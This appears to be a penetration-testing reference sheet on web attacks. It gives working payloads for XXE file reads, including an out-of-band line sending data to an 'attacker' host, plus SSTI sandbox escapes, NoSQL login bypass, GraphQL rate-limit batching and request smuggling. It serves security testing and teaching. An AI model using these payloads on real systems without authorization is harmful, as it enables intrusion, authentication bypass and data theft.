# Web Attacks (Beyond Basic)

Common web application attacks and identification techniques.

## HTTP Verb / Method Tampering

Test alternative methods:
- `GET`, `POST`, `PUT`, `DELETE`, `PATCH`, `OPTIONS`, `HEAD`, `TRACE`

```bash
curl -X PUT -d 'data=evil' http://target/resource
curl -X OPTIONS -i http://target/
```

Often bypasses poorly implemented auth or reveals hidden functionality.

## IDOR (Insecure Direct Object References)

**Find them**:
- Sequential IDs in URLs, JSON, form fields (`/user/123`, `id=124`)
- UUIDs / hashes — try nearby or predictable
- API endpoints, GraphQL queries, AJAX responses
- Compare responses across low vs high privilege accounts

**Test**:
```bash
curl http://target/api/user/1001
# Change to 1002, 999, admin ids etc.
```

Mitigations: proper authorization checks + indirect references.

## XXE (XML External Entity)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><name>&xxe;</name></root>
```

Useful entities:
- `file:///etc/passwd`
- `php://filter/convert.base64-encode/resource=index.php` (source disclosure)
- Out-of-band for blind: `http://attacker/?c=%file;`

Error-based and OOB variants when direct not possible.

## Other Important Web Attacks (2026)

### SSTI Examples
```html
{{7*7}}                     <!-- Jinja2 / Twig -->
${7*7}                      <!-- Java / Spring -->
<%= 7*7 %>                  <!-- ERB / Ruby -->
{{config}}                  <!-- Flask leak -->
{{ ''.__class__.__mro__[1].__subclasses__() }}  <!-- Python sandbox escape -->
```

### NoSQL Injection
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}
```

### GraphQL Attacks
```bash
# Introspection
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name}}}}"}' https://target/graphql

# Batching attack (rate limit bypass)
for i in {1..100}; do
  echo '{"query":"{user(id:'$i'){email}}"}'
done | parallel -j 20 'curl -X POST -d @- https://target/graphql'
```

### Request Smuggling (Simplified Test)
```bash
# CL.TE example (use Burp Repeater or Turbo Intruder for real testing)
printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n' | nc target 80
```

Use Burp, ffuf, and nuclei templates extensively.

References: PortSwigger top web hacking techniques of 2025, OWASP Top 10, HackTricks web.
